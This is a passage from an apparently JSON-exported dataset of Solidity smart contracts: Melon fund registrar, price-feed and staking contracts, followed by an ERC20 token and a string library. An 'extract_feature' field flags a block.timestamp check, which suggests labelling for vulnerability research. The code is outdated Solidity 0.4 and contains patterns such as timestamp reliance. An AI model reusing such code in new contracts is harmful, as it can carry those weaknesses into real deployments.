inputTakesCustody,\n bytes4[] inputFunctionSignatures\n )\n auth\n pre_cond(!exchangeInformation[ofExchange].exists)\n {\n exchangeInformation[ofExchange].exists = true;\n registeredExchanges.push(ofExchange);\n updateExchange(\n ofExchange,\n ofExchangeAdapter,\n inputTakesCustody,\n inputFunctionSignatures\n );\n assert(exchangeInformation[ofExchange].exists);\n }\n function updateAsset(\n address ofAsset,\n bytes32 inputName,\n bytes8 inputSymbol,\n uint inputDecimals,\n string inputUrl,\n string inputIpfsHash,\n address[2] ofBreakInBreakOut,\n uint[] inputStandards,\n bytes4[] inputFunctionSignatures\n )\n auth\n pre_cond(assetInformation[ofAsset].exists)\n {\n Asset asset = assetInformation[ofAsset];\n asset.name = inputName;\n asset.symbol = inputSymbol;\n asset.decimals = inputDecimals;\n asset.url = inputUrl;\n asset.ipfsHash = inputIpfsHash;\n asset.breakIn = ofBreakInBreakOut[0];\n asset.breakOut = ofBreakInBreakOut[1];\n asset.standards = inputStandards;\n asset.functionSignatures = inputFunctionSignatures;\n }\n function updateExchange(\n address ofExchange,\n address ofExchangeAdapter,\n bool inputTakesCustody,\n bytes4[] inputFunctionSignatures\n )\n auth\n pre_cond(exchangeInformation[ofExchange].exists)\n {\n Exchange exchange = exchangeInformation[ofExchange];\n exchange.adapter = ofExchangeAdapter;\n exchange.takesCustody = inputTakesCustody;\n exchange.functionSignatures = inputFunctionSignatures;\n }\n function removeAsset(\n address ofAsset,\n uint assetIndex\n )\n auth\n pre_cond(assetInformation[ofAsset].exists)\n {\n require(registeredAssets[assetIndex] == ofAsset);\n delete assetInformation[ofAsset];\n delete registeredAssets[assetIndex];\n for (uint i = assetIndex; i < registeredAssets.length-1; i++) {\n registeredAssets[i] = registeredAssets[i+1];\n }\n registeredAssets.length--;\n assert(!assetInformation[ofAsset].exists);\n }\n function removeExchange(\n address ofExchange,\n uint exchangeIndex\n )\n auth\n pre_cond(exchangeInformation[ofExchange].exists)\n {\n require(registeredExchanges[exchangeIndex] == ofExchange);\n delete exchangeInformation[ofExchange];\n delete registeredExchanges[exchangeIndex];\n for (uint i = exchangeIndex; i < registeredExchanges.length-1; i++) {\n registeredExchanges[i] = registeredExchanges[i+1];\n }\n registeredExchanges.length--;\n assert(!exchangeInformation[ofExchange].exists);\n }\n function getName(address ofAsset) view returns (bytes32) { return assetInformation[ofAsset].name; }\n function getSymbol(address ofAsset) view returns (bytes8) { return assetInformation[ofAsset].symbol; }\n function getDecimals(address ofAsset) view returns (uint) { return assetInformation[ofAsset].decimals; }\n function assetIsRegistered(address ofAsset) view returns (bool) { return assetInformation[ofAsset].exists; }\n function getRegisteredAssets() view returns (address[]) { return registeredAssets; }\n function assetMethodIsAllowed(\n address ofAsset, bytes4 querySignature\n )\n returns (bool)\n {\n bytes4[] memory signatures = assetInformation[ofAsset].functionSignatures;\n for (uint i = 0; i < signatures.length; i++) {\n if (signatures[i] == querySignature) {\n return true;\n }\n }\n return false;\n }\n function exchangeIsRegistered(address ofExchange) view returns (bool) { return exchangeInformation[ofExchange].exists; }\n function getRegisteredExchanges() view returns (address[]) { return registeredExchanges; }\n function getExchangeInformation(address ofExchange)\n view\n returns (address, bool)\n {\n Exchange exchange = exchangeInformation[ofExchange];\n return (\n exchange.adapter,\n exchange.takesCustody\n );\n }\n function getExchangeFunctionSignatures(address ofExchange)\n view\n returns (bytes4[])\n {\n return exchangeInformation[ofExchange].functionSignatures;\n }\n function exchangeMethodIsAllowed(\n address ofExchange, bytes4 querySignature\n )\n returns (bool)\n {\n bytes4[] memory signatures = exchangeInformation[ofExchange].functionSignatures;\n for (uint i = 0; i < signatures.length; i++) {\n if (signatures[i] == querySignature) {\n return true;\n }\n }\n return false;\n }\n}\ninterface SimplePriceFeedInterface {\n event PriceUpdated(bytes32 hash);\n function update(address[] ofAssets, uint[] newPrices) external;\n function getQuoteAsset() view returns (address);\n function getLastUpdateId() view returns (uint);\n function getPrice(address ofAsset) view returns (uint price, uint timestamp);\n function getPrices(address[] ofAssets) view returns (uint[] prices, uint[] timestamps);\n}\ncontract SimplePriceFeed is SimplePriceFeedInterface, DSThing, DBC {\n struct Data {\n uint price;\n uint timestamp;\n }\n mapping(address => Data) public assetsToPrices;\n address public QUOTE_ASSET;\n uint public updateId;\n CanonicalRegistrar public registrar;\n CanonicalPriceFeed public superFeed;\n function SimplePriceFeed(\n address ofRegistrar,\n address ofQuoteAsset,\n address ofSuperFeed\n ) {\n registrar = CanonicalRegistrar(ofRegistrar);\n QUOTE_ASSET = ofQuoteAsset;\n superFeed = CanonicalPriceFeed(ofSuperFeed);\n }\n function update(address[] ofAssets, uint[] newPrices)\n external\n auth\n {\n _updatePrices(ofAssets, newPrices);\n }\n function getQuoteAsset() view returns (address) { return QUOTE_ASSET; }\n function getLastUpdateId() view returns (uint) { return updateId; }\n function getPrice(address ofAsset)\n view\n returns (uint price, uint timestamp)\n {\n Data data = assetsToPrices[ofAsset];\n return (data.price, data.timestamp);\n }\n function getPrices(address[] ofAssets)\n view\n returns (uint[], uint[])\n {\n uint[] memory prices = new uint[](ofAssets.length);\n uint[] memory timestamps = new uint[](ofAssets.length);\n for (uint i; i < ofAssets.length; i++) {\n var (price, timestamp) = getPrice(ofAssets[i]);\n prices[i] = price;\n timestamps[i] = timestamp;\n }\n return (prices, timestamps);\n }\n function _updatePrices(address[] ofAssets, uint[] newPrices)\n internal\n pre_cond(ofAssets.length == newPrices.length)\n {\n updateId++;\n for (uint i = 0; i < ofAssets.length; ++i) {\n require(registrar.assetIsRegistered(ofAssets[i]));\n require(assetsToPrices[ofAssets[i]].timestamp != now);\n assetsToPrices[ofAssets[i]].timestamp = now;\n assetsToPrices[ofAssets[i]].price = newPrices[i];\n }\n emit PriceUpdated(keccak256(ofAssets, newPrices));\n }\n}\ncontract StakingPriceFeed is SimplePriceFeed {\n OperatorStaking public stakingContract;\n AssetInterface public stakingToken;\n function StakingPriceFeed(\n address ofRegistrar,\n address ofQuoteAsset,\n address ofSuperFeed\n )\n SimplePriceFeed(ofRegistrar, ofQuoteAsset, ofSuperFeed)\n {\n stakingContract = OperatorStaking(ofSuperFeed);\n stakingToken = AssetInterface(stakingContract.stakingToken());\n }\n function depositStake(uint amount, bytes data)\n external\n auth\n {\n require(stakingToken.transferFrom(msg.sender, address(this), amount));\n require(stakingToken.approve(stakingContract, amount));\n stakingContract.stake(amount, data);\n }\n function unstake(uint amount, bytes data)\n external\n auth\n {\n stakingContract.unstake(amount, data);\n }\n function withdrawStake()\n external\n auth\n {\n uint amountToWithdraw = stakingContract.stakeToWithdraw(address(this));\n stakingContract.withdrawStake();\n require(stakingToken.transfer(msg.sender, amountToWithdraw));\n }\n}\ninterface RiskMgmtInterface {\n function isMakePermitted(\n uint orderPrice,\n uint referencePrice,\n address sellAsset,\n address buyAsset,\n uint sellQuantity,\n uint buyQuantity\n ) view returns (bool);\n function isTakePermitted(\n uint orderPrice,\n uint referencePrice,\n address sellAsset,\n address buyAsset,\n uint sellQuantity,\n uint buyQuantity\n ) view returns (bool);\n}\ncontract OperatorStaking is DBC {\n event Staked(address indexed user, uint256 amount, uint256 total, bytes data);\n event Unstaked(address indexed user, uint256 amount, uint256 total, bytes data);\n event StakeBurned(address indexed user, uint256 amount, bytes data);\n struct StakeData {\n uint amount;\n address staker;\n }\n struct Node {\n StakeData data;\n uint prev;\n uint next;\n }\n Node[] internal stakeNodes;\n uint public minimumStake;\n uint public numOperators;\n uint public withdrawalDelay;\n mapping (address => bool) public isRanked;\n mapping (address => uint) public latestUnstakeTime;\n mapping (address => uint) public stakeToWithdraw;\n mapping (address => uint) public stakedAmounts;\n uint public numStakers;\n AssetInterface public stakingToken;\n function OperatorStaking(\n AssetInterface _stakingToken,\n uint _minimumStake,\n uint _numOperators,\n uint _withdrawalDelay\n )\n public\n {\n require(address(_stakingToken) != address(0));\n stakingToken = _stakingToken;\n minimumStake = _minimumStake;\n numOperators = _numOperators;\n withdrawalDelay = _withdrawalDelay;\n StakeData memory temp = StakeData({ amount: 0, staker: address(0) });\n stakeNodes.push(Node(temp, 0, 0));\n }\n function stake(\n uint amount,\n bytes data\n )\n public\n pre_cond(amount >= minimumStake)\n {\n stakedAmounts[msg.sender] += amount;\n updateStakerRanking(msg.sender);\n require(stakingToken.transferFrom(msg.sender, address(this), amount));\n }\n function unstake(\n uint amount,\n bytes data\n )\n public\n {\n uint preStake = stakedAmounts[msg.sender];\n uint postStake = preStake - amount;\n require(postStake >= minimumStake || postStake == 0);\n require(stakedAmounts[msg.sender] >= amount);\n latestUnstakeTime[msg.sender] = block.timestamp;\n stakedAmounts[msg.sender] -= amount;\n stakeToWithdraw[msg.sender] += amount;\n updateStakerRanking(msg.sender);\n emit Unstaked(msg.sender, amount, stakedAmounts[msg.sender], data);\n }\n function withdrawStake()\n public\n pre_cond(stakeToWithdraw[msg.sender] > 0)\n pre_cond(block.timestamp >= latestUnstakeTime[msg.sender] + withdrawalDelay)\n {\n uint amount = stakeToWithdraw[msg.sender];\n stakeToWithdraw[msg.sender] = 0;\n require(stakingToken.transfer(msg.sender, amount));\n }\n function isValidNode(uint id) view returns (bool) {\n return id != 0 && (id == stakeNodes[0].next || stakeNodes[id].prev != 0);\n }\n function searchNode(address staker) view returns (uint) {\n uint current = stakeNodes[0].next;\n while (isValidNode(current)) {\n if (staker == stakeNodes[current].data.staker) {\n return current;\n }\n current = stakeNodes[current].next;\n }\n return 0;\n }\n function isOperator(address user) view returns (bool) {\n address[] memory operators = getOperators();\n for (uint i; i < operators.length; i++) {\n if (operators[i] == user) {\n return true;\n }\n }\n return false;\n }\n function getOperators()\n view\n returns (address[])\n {\n uint arrLength = (numOperators > numStakers) ?\n numStakers :\n numOperators;\n address[] memory operators = new address[](arrLength);\n uint current = stakeNodes[0].next;\n for (uint i; i < arrLength; i++) {\n operators[i] = stakeNodes[current].data.staker;\n current = stakeNodes[current].next;\n }\n return operators;\n }\n function getStakersAndAmounts()\n view\n returns (address[], uint[])\n {\n address[] memory stakers = new address[](numStakers);\n uint[] memory amounts = new uint[](numStakers);\n uint current = stakeNodes[0].next;\n for (uint i; i < numStakers; i++) {\n stakers[i] = stakeNodes[current].data.staker;\n amounts[i] = stakeNodes[current].data.amount;\n current = stakeNodes[current].next;\n }\n return (stakers, amounts);\n }\n function totalStakedFor(address user)\n view\n returns (uint)\n {\n return stakedAmounts[user];\n }\n function insertNodeSorted(uint amount, address staker) internal returns (uint) {\n uint current = stakeNodes[0].next;\n if (current == 0) return insertNodeAfter(0, amount, staker);\n while (isValidNode(current)) {\n if (amount > stakeNodes[current].data.amount) {\n break;\n }\n current = stakeNodes[current].next;\n }\n return insertNodeBefore(current, amount, staker);\n }\n function insertNodeAfter(uint id, uint amount, address staker) internal returns (uint newID) {\n require(id == 0 || isValidNode(id));\n Node storage node = stakeNodes[id];\n stakeNodes.push(Node({\n data: StakeData(amount, staker),\n prev: id,\n next: node.next\n }));\n newID = stakeNodes.length - 1;\n stakeNodes[node.next].prev = newID;\n node.next = newID;\n numStakers++;\n }\n function insertNodeBefore(uint id, uint amount, address staker) internal returns (uint) {\n return insertNodeAfter(stakeNodes[id].prev, amount, staker);\n }\n function removeNode(uint id) internal {\n require(isValidNode(id));\n Node storage node = stakeNodes[id];\n stakeNodes[node.next].prev = node.prev;\n stakeNodes[node.prev].next = node.next;\n delete stakeNodes[id];\n numStakers--;\n }\n function updateStakerRanking(address _staker) internal {\n uint newStakedAmount = stakedAmounts[_staker];\n if (newStakedAmount == 0) {\n isRanked[_staker] = false;\n removeStakerFromArray(_staker);\n } else if (isRanked[_staker]) {\n removeStakerFromArray(_staker);\n insertNodeSorted(newStakedAmount, _staker);\n } else {\n isRanked[_staker] = true;\n insertNodeSorted(newStakedAmount, _staker);\n }\n }\n function removeStakerFromArray(address _staker) internal {\n uint id = searchNode(_staker);\n require(id > 0);\n removeNode(id);\n }\n}\ncontract CanonicalPriceFeed is OperatorStaking, SimplePriceFeed, CanonicalRegistrar {\n event SetupPriceFeed(address ofPriceFeed);\n struct HistoricalPrices {\n address[] assets;\n uint[] prices;\n uint timestamp;\n }\n bool public updatesAreAllowed = true;\n uint public minimumPriceCount = 1;\n uint public VALIDITY;\n uint public INTERVAL;\n mapping (address => bool) public isStakingFeed;\n HistoricalPrices[] public priceHistory;\n function CanonicalPriceFeed(\n address ofStakingAsset,\n address ofQuoteAsset,\n bytes32 quoteAssetName,\n bytes8 quoteAssetSymbol,\n uint quoteAssetDecimals,\n string quoteAssetUrl,\n string quoteAssetIpfsHash,\n address[2] quoteAssetBreakInBreakOut,\n uint[] quoteAssetStandards,\n bytes4[] quoteAssetFunctionSignatures,\n uint[2] updateInfo,\n uint[3] stakingInfo,\n address ofGovernance\n )\n OperatorStaking(\n AssetInterface(ofStakingAsset), stakingInfo[0], stakingInfo[1], stakingInfo[2]\n )\n SimplePriceFeed(address(this), ofQuoteAsset, address(0))\n {\n registerAsset(\n ofQuoteAsset,\n quoteAssetName,\n quoteAssetSymbol,\n quoteAssetDecimals,\n quoteAssetUrl,\n quoteAssetIpfsHash,\n quoteAssetBreakInBreakOut,\n quoteAssetStandards,\n quoteAssetFunctionSignatures\n );\n INTERVAL = updateInfo[0];\n VALIDITY = updateInfo[1];\n setOwner(ofGovernance);\n }\n function setupStakingPriceFeed() external {\n address ofStakingPriceFeed = new StakingPriceFeed(\n address(this),\n stakingToken,\n address(this)\n );\n isStakingFeed[ofStakingPriceFeed] = true;\n StakingPriceFeed(ofStakingPriceFeed).setOwner(msg.sender);\n emit SetupPriceFeed(ofStakingPriceFeed);\n }\n function update(address[] ofAssets, uint[] newPrices) external { revert(); }\n function burnStake(address user)\n external\n auth\n {\n uint totalToBurn = add(stakedAmounts[user], stakeToWithdraw[user]);\n stakedAmounts[user] = 0;\n stakeToWithdraw[user] = 0;\n updateStakerRanking(user);\n emit StakeBurned(user, totalToBurn, \"\");\n }\n function stake(\n uint amount,\n bytes data\n )\n public\n pre_cond(isStakingFeed[msg.sender])\n {\n OperatorStaking.stake(amount, data);\n }\n function collectAndUpdate(address[] ofAssets)\n public\n auth\n pre_cond(updatesAreAllowed)\n {\n uint[] memory newPrices = pricesToCommit(ofAssets);\n priceHistory.push(\n HistoricalPrices({assets: ofAssets, prices: newPrices, timestamp: block.timestamp})\n );\n _updatePrices(ofAssets, newPrices);\n }\n function pricesToCommit(address[] ofAssets)\n view\n returns (uint[])\n {\n address[] memory operators = getOperators();\n uint[] memory newPrices = new uint[](ofAssets.length);\n for (uint i = 0; i < ofAssets.length; i++) {\n uint[] memory assetPrices = new uint[](operators.length);\n for (uint j = 0; j < operators.length; j++) {\n SimplePriceFeed feed = SimplePriceFeed(operators[j]);\n var (price, timestamp) = feed.assetsToPrices(ofAssets[i]);\n if (now > add(timestamp, VALIDITY)) {\n continue;\n }\n assetPrices[j] = price;\n }\n newPrices[i] = medianize(assetPrices);\n }\n return newPrices;\n }\n function medianize(uint[] unsorted)\n view\n returns (uint)\n {\n uint numValidEntries;\n for (uint i = 0; i < unsorted.length; i++) {\n if (unsorted[i] != 0) {\n numValidEntries++;\n }\n }\n if (numValidEntries < minimumPriceCount) {\n revert();\n }\n uint counter;\n uint[] memory out = new uint[](numValidEntries);\n for (uint j = 0; j < unsorted.length; j++) {\n uint item = unsorted[j];\n if (item != 0) {\n if (counter == 0 || item >= out[counter - 1]) {\n out[counter] = item;\n } else {\n uint k = 0;\n while (item >= out[k]) {\n k++;\n }\n for (uint m = counter; m > k; m--) {\n out[m] = out[m - 1];\n }\n out[k] = item;\n }\n counter++;\n }\n }\n uint value;\n if (counter % 2 == 0) {\n uint value1 = uint(out[(counter / 2) - 1]);\n uint value2 = uint(out[(counter / 2)]);\n value = add(value1, value2) / 2;\n } else {\n value = out[(counter - 1) / 2];\n }\n return value;\n }\n function setMinimumPriceCount(uint newCount) auth { minimumPriceCount = newCount; }\n function enableUpdates() auth { updatesAreAllowed = true; }\n function disableUpdates() auth { updatesAreAllowed = false; }\n function getQuoteAsset() view returns (address) { return QUOTE_ASSET; }\n function getInterval() view returns (uint) { return INTERVAL; }\n function getValidity() view returns (uint) { return VALIDITY; }\n function getLastUpdateId() view returns (uint) { return updateId; }\n function hasRecentPrice(address ofAsset)\n view\n pre_cond(assetIsRegistered(ofAsset))\n returns (bool isRecent)\n {\n var ( , timestamp) = getPrice(ofAsset);\n return (sub(now, timestamp) <= VALIDITY);\n }\n function hasRecentPrices(address[] ofAssets)\n view\n returns (bool areRecent)\n {\n for (uint i; i < ofAssets.length; i++) {\n if (!hasRecentPrice(ofAssets[i])) {\n return false;\n }\n }\n return true;\n }\n function getPriceInfo(address ofAsset)\n view\n returns (bool isRecent, uint price, uint assetDecimals)\n {\n isRecent = hasRecentPrice(ofAsset);\n (price, ) = getPrice(ofAsset);\n assetDecimals = getDecimals(ofAsset);\n }\n function getInvertedPriceInfo(address ofAsset)\n view\n returns (bool isRecent, uint invertedPrice, uint assetDecimals)\n {\n uint inputPrice;\n (isRecent, inputPrice, assetDecimals) = getPriceInfo(ofAsset);\n uint quoteDecimals = getDecimals(QUOTE_ASSET);\n return (\n isRecent,\n mul(10 ** uint(quoteDecimals), 10 ** uint(assetDecimals)) / inputPrice,\n quoteDecimals\n );\n }\n function getReferencePriceInfo(address ofBase, address ofQuote)\n view\n returns (bool isRecent, uint referencePrice, uint decimal)\n {\n if (getQuoteAsset() == ofQuote) {\n (isRecent, referencePrice, decimal) = getPriceInfo(ofBase);\n } else if (getQuoteAsset() == ofBase) {\n (isRecent, referencePrice, decimal) = getInvertedPriceInfo(ofQuote);\n } else {\n revert();\n }\n }\n function getOrderPriceInfo(\n address sellAsset,\n address buyAsset,\n uint sellQuantity,\n uint buyQuantity\n )\n view\n returns (uint orderPrice)\n {\n return mul(buyQuantity, 10 ** uint(getDecimals(sellAsset))) / sellQuantity;\n }\n function existsPriceOnAssetPair(address sellAsset, address buyAsset)\n view\n returns (bool isExistent)\n {\n return\n hasRecentPrice(sellAsset) &&\n hasRecentPrice(buyAsset) &&\n (buyAsset == QUOTE_ASSET || sellAsset == QUOTE_ASSET) &&\n (buyAsset != QUOTE_ASSET || sellAsset != QUOTE_ASSET);\n }\n function getPriceFeedsByOwner(address _owner)\n view\n returns(address[])\n {\n address[] memory ofPriceFeeds = new address[](numStakers);\n if (numStakers == 0) return ofPriceFeeds;\n uint current = stakeNodes[0].next;\n for (uint i; i < numStakers; i++) {\n StakingPriceFeed stakingFeed = StakingPriceFeed(stakeNodes[current].data.staker);\n if (stakingFeed.owner() == _owner) {\n ofPriceFeeds[i] = address(stakingFeed);\n }\n current = stakeNodes[current].next;\n }\n return ofPriceFeeds;\n }\n function getHistoryLength() returns (uint) { return priceHistory.length; }\n function getHistoryAt(uint id) returns (address[], uint[], uint) {\n address[] memory assets = priceHistory[id].assets;\n uint[] memory prices = priceHistory[id].prices;\n uint timestamp = priceHistory[id].timestamp;\n return (assets, prices, timestamp);\n }\n}\ninterface VersionInterface {\n event FundUpdated(uint id);\n function shutDown() external;\n function setupFund(\n bytes32 ofFundName,\n address ofQuoteAsset,\n uint ofManagementFee,\n uint ofPerformanceFee,\n address ofCompliance,\n address ofRiskMgmt,\n address[] ofExchanges,\n address[] ofDefaultAssets,\n uint8 v,\n bytes32 r,\n bytes32 s\n );\n function shutDownFund(address ofFund);\n function getNativeAsset() view returns (address);\n function getFundById(uint withId) view returns (address);\n function getLastFundId() view returns (uint);\n function getFundByManager(address ofManager) view returns (address);\n function termsAndConditionsAreSigned(uint8 v, bytes32 r, bytes32 s) view returns (bool signed);\n}\ncontract Version is DBC, Owned, VersionInterface {\n bytes32 public constant TERMS_AND_CONDITIONS = 0xAA9C907B0D6B4890E7225C09CBC16A01CB97288840201AA7CDCB27F4ED7BF159;\n string public VERSION_NUMBER;\n address public MELON_ASSET;\n address public NATIVE_ASSET;\n address public GOVERNANCE;\n address public CANONICAL_PRICEFEED;\n bool public isShutDown;\n address public COMPLIANCE;\n address[] public listOfFunds;\n mapping (address => address) public managerToFunds;\n event FundUpdated(address ofFund);\n function Version(\n string versionNumber,\n address ofGovernance,\n address ofMelonAsset,\n address ofNativeAsset,\n address ofCanonicalPriceFeed,\n address ofCompetitionCompliance\n ) {\n VERSION_NUMBER = versionNumber;\n GOVERNANCE = ofGovernance;\n MELON_ASSET = ofMelonAsset;\n NATIVE_ASSET = ofNativeAsset;\n CANONICAL_PRICEFEED = ofCanonicalPriceFeed;\n COMPLIANCE = ofCompetitionCompliance;\n }\n function shutDown() external pre_cond(msg.sender == GOVERNANCE) { isShutDown = true; }\n function setupFund(\n bytes32 ofFundName,\n address ofQuoteAsset,\n uint ofManagementFee,\n uint ofPerformanceFee,\n address ofCompliance,\n address ofRiskMgmt,\n address[] ofExchanges,\n address[] ofDefaultAssets,\n uint8 v,\n bytes32 r,\n bytes32 s\n ) {\n require(!isShutDown);\n require(termsAndConditionsAreSigned(v, r, s));\n require(CompetitionCompliance(COMPLIANCE).isCompetitionAllowed(msg.sender));\n require(managerToFunds[msg.sender] == address(0));\n address[] memory melonAsDefaultAsset = new address[](1);\n melonAsDefaultAsset[0] = MELON_ASSET;\n address ofFund = new Fund(\n msg.sender,\n ofFundName,\n NATIVE_ASSET,\n 0,\n 0,\n COMPLIANCE,\n ofRiskMgmt,\n CANONICAL_PRICEFEED,\n ofExchanges,\n melonAsDefaultAsset\n );\n listOfFunds.push(ofFund);\n managerToFunds[msg.sender] = ofFund;\n emit FundUpdated(ofFund);\n }\n function shutDownFund(address ofFund)\n pre_cond(isShutDown || managerToFunds[msg.sender] == ofFund)\n {\n Fund fund = Fund(ofFund);\n delete managerToFunds[msg.sender];\n fund.shutDown();\n emit FundUpdated(ofFund);\n }\n function termsAndConditionsAreSigned(uint8 v, bytes32 r, bytes32 s) view returns (bool signed) {\n return ecrecover(\n keccak256(\"\\x19Ethereum Signed Message:\\n32\", TERMS_AND_CONDITIONS),\n v,\n r,\n s\n ) == msg.sender;\n }\n function getNativeAsset() view returns (address) { return NATIVE_ASSET; }\n function getFundById(uint withId) view returns (address) { return listOfFunds[withId]; }\n function getLastFundId() view returns (uint) { return listOfFunds.length - 1; }\n function getFundByManager(address ofManager) view returns (address) { return managerToFunds[ofManager]; }\n}",
  "extract_feature": [
    "function orderExpired(address ofExchange, address ofAsset) view returns (bool) {\nuint expiryTime = exchangesToOpenMakeOrders[ofExchange][ofAsset].expiresAt;\nrequire(expiryTime > 0);\nreturn block.timestamp >= expiryTime;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f15"
  },
  "filename": "6472.sol",
  "content": "pragma solidity 0.4.24;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint256 _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint256 _subtractedValue\n )\n public\n returns (bool)\n {\n uint256 oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\nlibrary strings {\n struct slice {\n uint _len;\n uint _ptr;\n }\n function memcpy(uint dest, uint src, uint len) private pure {\n for(; len >= 32; len -= 32) {\n assembly {\n mstore(dest, mload(src))\n }\n dest += 32;\n src += 32;\n }\n uint mask = 256 ** (32 - len) - 1;\n assembly {\n let srcpart := and(mload(src), not(mask))\n let destpart := and(mload(dest), mask)\n mstore(dest, or(destpart, srcpart))\n }\n }\n function toSlice(string self) internal pure returns (slice) {\n uint ptr;\n assembly {\n ptr := add(self, 0x20)\n }\n return slice(bytes(self).length, ptr);\n }\n function len(bytes32 self) internal pure returns (uint) {\n uint ret;\n if (self == 0)\n return 0;\n if (self & 0xffffffffffffffffffffffffffffffff == 0) {\n ret += 16;\n self = bytes32(uint(self) / 0x100000000000000000000000000000000);\n }\n if (self & 0xffffffffffffffff == 0) {\n ret += 8;\n self = bytes32(uint(self) / 0x10000000000000000);\n }\n if (self & 0xffffffff == 0) {\n ret += 4;\n self = bytes32(uint(self) / 0x100000000);\n }\n if (self & 0xffff == 0) {\n ret += 2;\n self = bytes32(uint(self) / 0x10000);\n }\n if (self & 0xff == 0) {\n ret += 1;\n }\n return 32 - ret;\n }\n function toSliceB32(bytes32 self) internal pure returns (slice ret) {\n assembly {\n let ptr := mload(0x40)\n mstore(0x40, add(ptr, 0x20))\n mstore(ptr, self)\n mstore(add(ret, 0x20), ptr)\n }\n ret._len = len(self);\n }\n function copy(slice self) internal pure returns (slice) {\n return slice(self._len, self._ptr);\n }\n function toString(slice self) internal pure returns (string) {\n string memory ret = new string(self._len);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n memcpy(retptr, self._ptr, self._len);\n return ret;\n }\n function len(slice self) internal pure returns (uint l) {\n uint ptr = self._ptr - 31;\n uint end = ptr + self._len;\n for (l = 0; ptr < end; l++) {\n uint8 b;\n assembly { b := and(mload(ptr), 0xFF) }\n if (b < 0x80) {\n ptr += 1;\n } else if(b < 0xE0) {\n ptr += 2;\n } else if(b < 0xF0) {\n ptr += 3;\n } else if(b < 0xF8) {\n ptr += 4;\n } else if(b < 0xFC) {\n ptr += 5;\n } else {\n ptr += 6;\n }\n }\n }\n function empty(slice self) internal pure returns (bool) {\n return self._len == 0;\n }\n function compare(slice self, slice other) internal pure returns (int) {\n uint shortest = self._len;\n if (other._len < self._len)\n shortest = other._len;\n uint selfptr = self._ptr;\n uint otherptr = other._ptr;\n for (uint idx = 0; idx < shortest; idx += 32) {\n uint a;\n uint b;\n assembly {\n a := mload(selfptr)\n b := mload(otherptr)\n }\n if (a != b) {\n uint256 mask = uint256(-1);\n if(shortest < 32) {\n mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\n }\n uint256 diff = (a & mask) - (b & mask);\n if (diff != 0)\n return int(diff);\n }\n selfptr += 32;\n otherptr += 32;\n }\n return int(self._len) - int(other._len);\n }\n function equals(slice self, slice other) internal pure returns (bool) {\n return compare(self, other) == 0;\n }\n function nextRune(slice self, slice rune) internal pure returns (slice) {\n rune._ptr = self._ptr;\n if (self._len == 0) {\n rune._len = 0;\n return rune;\n }\n uint l;\n uint b;\n assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\n if (b < 0x80) {\n l = 1;\n } else if(b < 0xE0) {\n l = 2;\n } else if(b < 0xF0) {\n l = 3;\n } else {\n l = 4;\n }\n if (l > self._len) {\n rune._len = self._len;\n self._ptr += self._len;\n self._len = 0;\n return rune;\n }\n self._ptr += l;\n self._len -= l;\n rune._len = l;\n return rune;\n }\n function nextRune(slice self) internal pure returns (slice ret) {\n nextRune(self, ret);\n }\n function ord(slice self) internal pure returns (uint ret) {\n if (self._len == 0) {\n return 0;\n }\n uint word;\n uint length;\n uint divisor = 2 ** 248;\n assembly { word:= mload(mload(add(self, 32))) }\n uint b = word / divisor;\n if (b < 0x80) {\n ret = b;\n length = 1;\n } else if(b < 0xE0) {\n ret = b & 0x1F;\n length = 2;\n } else if(b < 0xF0) {\n ret = b & 0x0F;\n length = 3;\n } else {\n ret = b & 0x07;\n length = 4;\n }\n if (length > self._len) {\n return 0;\n }\n 